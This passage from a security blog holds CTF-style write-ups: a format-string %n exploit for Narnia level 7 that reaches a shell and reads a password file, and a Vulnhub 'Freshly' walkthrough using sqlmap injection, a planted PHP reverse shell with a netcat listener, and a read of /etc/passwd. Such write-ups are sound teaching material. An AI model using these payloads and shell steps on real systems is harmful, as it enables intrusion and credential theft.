   0x08048646 &lt;+121&gt;:	movl   $0x8048818,(%esp)
   0x0804864d &lt;+128&gt;:	call   0x8048450 &lt;puts@plt&gt;
   0x08048652 &lt;+133&gt;:	movl   $0x2,(%esp)
   0x08048659 &lt;+140&gt;:	call   0x8048440 &lt;sleep@plt&gt;
   0x0804865e &lt;+145&gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &lt;+155&gt;:	mov    0x8(%ebp),%eax
   0x0804866b &lt;+158&gt;:	mov    %eax,0x8(%esp)
   0x0804866f &lt;+162&gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &lt;+170&gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &lt;+176&gt;:	mov    %eax,(%esp)
   0x08048680 &lt;+179&gt;:	call   0x80484c0 &lt;snprintf@plt&gt;
   0x08048685 &lt;+184&gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &lt;+190&gt;:	call   *%eax
   0x0804868d &lt;+192&gt;:	leave  
   0x0804868e &lt;+193&gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
</pre></div>
</p>

<p>So disassmble the <code>vuln</code> function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of <code>%x</code> you need. Using
<code>ltrace</code> it&rsquo;s possible to increment the number of <code>%x</code>&rsquo;s until you
see your string in the output again. I&rsquo;ll paste only the correcy output here</p>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia7@melinda:/narnia$ ltrace ./narnia7 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;`</span>
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;
memset(0xffffd630, &#39;\0&#39;, 128)                                = 0xffffd630
printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&quot;aaaabbbb8048238ffffd688f7ffda940&quot;..., 128, &quot;aaaabbbb%x%x%x%x%x%x%x&quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &lt;no return ...&gt;
+++ exited (status 0) +++
</pre></div>
</td></tr></table></p>

<p>You can see the <em>aaaa</em> and <em>bbbb</em> at line 14. So we have 7 <code>%x</code> to get the second value.</p>

<p>Let&rsquo;s take a look at the stack with that input</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)
Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
</pre></div>
</p>

<p>So at <code>0xffffd60c</code> is the address of <code>goodfunction</code>. We need to overwrite that
to point to <code>0x8048706</code>, our <code>hackedfunction</code>. So as before in <a href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
we use <code>%n</code> to try and overwrite this value.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
</pre></div>
</p>

<p>The value of <em>2f</em> at <code>0xffffd60c</code> shows us that our overwrite was successful
and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <em>134514438</em> in decimal.
So let&rsquo;s add our <code>%d</code> in and remember to adjust the number of <code>%x</code>s too, so we can see
how much padding we need</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
</pre></div>
</p>

<p>Ok, so <code>0x8048706 - 0x00000031 = 0x80486d6</code> or <em>134514389</em> in decimal.
Let&rsquo;s see if I&rsquo;m right</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
</pre></div>
</p>

<p>Still a little off. Adjusting the value again</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
</pre></div>
</p>

<p>And now we need to run it from the commandline to actually get a proper setuid shell</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia7@melinda:/narnia$ .//narnia7 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa\x1c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8 
[password]
</pre></div>
</p>

<p>Notice that the address of <code>ptrf</code> is not the same in the shell :)</p>

<h2 id="level-08:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 08</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">// gcc&#39;s variable reordering fucked things up</span>
<span style="color: #75715e">// to keep the level in its old style i am </span>
<span style="color: #75715e">// making &quot;i&quot; global unti i find a fix </span>
<span style="color: #75715e">// -morla </span>
<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span> 

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">func</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">b){</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">blah</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">b;</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">bok[</span><span style="color: #ae81ff">20</span><span style="color: #f8f8f2">];</span>
    <span style="color: #75715e">//int i=0;</span>
    
    <span style="color: #f8f8f2">memset(bok,</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(bok));</span>
    <span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">blah[i]</span> <span style="color: #f92672">!=</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
        <span style="color: #f8f8f2">bok[i]</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">blah[i];</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,bok);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
        
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>       
        <span style="color: #f8f8f2">func(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
    <span style="color: #66d9ef">else</span>    
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s argument</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>I&rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&rsquo;ll update this when I have this figured out.</p>

<p>Sorry.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/04/11/vulnhubs-freshly/">
        Vulnhub&#39;s &#39;TopHatSec Freshly&#39;
      </a>
    </h1>

    <span class="post-date">Sat, Apr 11, 2015</span>

    <p>This is my first writeup of a <a href="https://vulnhub.com">Vulnhub</a> wargame: Freshly.</p>

<p>The challenge is:</p>

<pre><code>The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
</code></pre>

<p>Go grab the image and follow along.</p>

<p>First I need to determine the image&rsquo;s IP address and what services it is running:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
</pre></div>


<p>So I can see the host is at <code>192.168.56.103</code> and has ports <em>80, 443, and 8080</em>
open. Browsing to the address presents an animated gif.</p>


<figure >
    
        <img src="http://i.imgur.com/qgkgkgg.png" />
    
    
</figure>


<p>My initial reaction is
to look at the source, but here I only see the <code>&lt;img&gt;</code> tag and the image filename.
The image filename could be useful later, but right now I see no use for it.</p>

<p>In that case let&rsquo;s see if the SSL port holds anything more interesting.</p>


<figure >
    
        <img src="http://i.imgur.com/wvHo8ru.png" />
    
    
</figure>


<p>Nice, looks like I&rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.</p>


<figure >
    
        <img src="http://i.imgur.com/SHEXup3.png" />
    
    
</figure>


<p>Before I start work on that, let me just see what&rsquo;s at port <em>8080</em>. Ah, it&rsquo;s a
non <em>https</em> version of the wordpress site. I&rsquo;m going to use that instead
of the <em>https</em> version to avoid any certificate issues and generally make life
a bit easier.</p>

<p>Using <code>wpscan</code> I can find out which of the installed plugins have vulnerabilities.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &#39;http://192.168.56.103:8080/wordpress/readme.html&#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &lt;============================================&gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
</pre></div>


<p>There&rsquo;s a few there, so I&rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.</p>

<ul>
<li><p>Cart66 Lite &lt;= 1.5.3 - SQL Injection</p>

<p>This requires the user to be logged in, and seeing as I don&rsquo;t have a login
I won&rsquo;t get very far with this.</p></li>

<li><p>Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###</p>

<p>This requires admin access to the site, in order to configure the plugin.
Another dead end.</p></li>

<li><p>ProPlayer 4.7.9.1 - SQL Injection</p>

<p>Not much luck with this. Although it doesn&rsquo;t require a login, I wasn&rsquo;t
successful with getting anything out of it.</p></li>

<li><p>WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect</p>

<p>I doubt that an unvalidated redirect will be of much use here.</p></li>
</ul>

<p>Ok, thinking cap back on&hellip;. I need a different angle of attack.</p>

<p>Revisiting the main wordpress site there is something a bit unusual.</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/2ddRfdF.png" />
    
    
</figure>
</p>

<p>Did I miss something? Did I get done by a Jedi mindtrick? Let&rsquo;s see. I&rsquo;ll
head back to the main site and try and find some other pages with <em>DirBuster</em>.</p>

<p>This is how I set it up</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/auVPaoO.png" />
    
    
</figure>
</p>

<p>Using this list I got lucky and received two interesting hits after short while</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/l647X5u.png" />
    
    
</figure>
</p>

<p>I&rsquo;ve decided to hold back on on the <code>phpmyadmin</code> and investigate the <code>login.php</code>
first. This is what lies at the end of that URL</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/c8aSx4n.png" />
    
    
</figure>
</p>

<p>I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&rsquo;s stuff. Roll out <code>sqlmap</code> and let&rsquo;s see what we can find:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap  -u <span style="color: #e6db74">&quot;192.168.56.103/login.php&quot;</span> --data<span style="color: #f92672">=</span><span style="color: #e6db74">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span>

&lt;snip&gt;

POST parameter &#39;user&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&lt;snip&gt;

POST parameter &#39;password&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&lt;snip&gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
</pre></div>
</p>

<p>I&rsquo;ve removed some of the output for clarity, but I can see
that there&rsquo;s possibility of a blind SQL injection for both <code>user</code> and
<code>password</code> and that it&rsquo;s a MySQL databse. Great.
We can carry on using <code>sqlmap</code> to try and discover
what tables there are and if we can find any useful information.</p>

<p>First I&rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &ldquo;<em>do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &lsquo;&ndash;time-sec&rsquo;)? [Y/n]</em>&rdquo; answer <em>YES</em>. It will be done quicker.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap  -u <span style="color: #e6db74">&quot;192.168.56.103/login.php&quot;</span> --data<span style="color: #f92672">=</span><span style="color: #e6db74">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span style="color: #f92672">=</span>mysql --dbs

&lt;snip&gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/192.168.56.103&#39;

[*] shutting down at 12:25:44
</pre></div>
</p>

<p>It found seven databases, amongst which is an interesting one: <code>wordpress8080</code>.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the <em>admin</em> account. The <code>login</code> and <code>users</code> databases also look
interesting, so let&rsquo;s take a look at those later. Additionally, if I can get
a login, especially an <em>admin</em> one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap  -u <span style="color: #e6db74">&quot;192.168.56.103/login.php&quot;</span> --data<span style="color: #f92672">=</span><span style="color: #e6db74">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span style="color: #f92672">=</span>mysql --tables -D wordpress8080

&lt;snip&gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u <span style="color: #e6db74">&quot;192.168.56.103/login.php&quot;</span> --data<span style="color: #f92672">=</span><span style="color: #e6db74">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span style="color: #f92672">=</span>mysql --dump -T users -D wordpress8080

&lt;snip&gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
</pre></div>
</p>

<p>The admin password for the wordpress site, excellent. As for the other tables,
I didn&rsquo;t find anything useful in them, so I won&rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&hellip; <code>cd /usr/share/webshells/php</code> and I&rsquo;m going to use the
<code>php-reverse-shell.php</code> and replace the site&rsquo;s <em>404</em> with that.</p>

<p>To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening <code>netcat</code> session and
browse to a non-existant page on the site.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&#39;t access tty; job control turned off
$ <span style="color: #f8f8f2">cd</span> /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# <span style="color: #f8f8f2">SECRET</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
